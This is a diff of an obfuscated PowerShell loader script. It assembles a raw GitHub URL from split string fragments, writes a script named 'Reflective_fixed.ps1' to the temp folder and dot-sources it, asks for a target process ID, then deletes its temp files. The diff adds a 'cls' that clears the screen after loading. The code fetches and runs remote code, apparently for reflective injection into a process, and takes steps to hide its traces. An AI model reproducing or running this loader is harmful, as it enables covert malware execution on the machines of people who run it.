@@ -3,7 +3,7 @@ $ErrorActionPreference = @("St","op") -join ""
 $_0x91A = @(
 "https://raw",
 ".githubusercontent",
-".com/CONNERZZZ",
+".com//CONNERZZZ",
 "/aaa1/refs",
 "/heads/main/",
 "win64"
@@ -40,7 +40,7 @@ $_0xC11 = "$env:TEMP\Reflective_fixed.ps1"
 $_0xA77 | Set-Content $_0xC11 -Encoding UTF8
 
 . $_0xC11
-
+cls
 $_0x2AA = Read-Host (@("Enter"," PID") -join "")
 
 start $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -51,5 +51,4 @@ Remove-Item $_0xB2F -Force -ErrorAction SilentlyContinue
 
 Get-ChildItem (@("$env:TEMP","/Reflective_*.ps1") -join "") -ErrorAction SilentlyContinue |
 Remove-Item -Force -ErrorAction SilentlyContinue
-
 
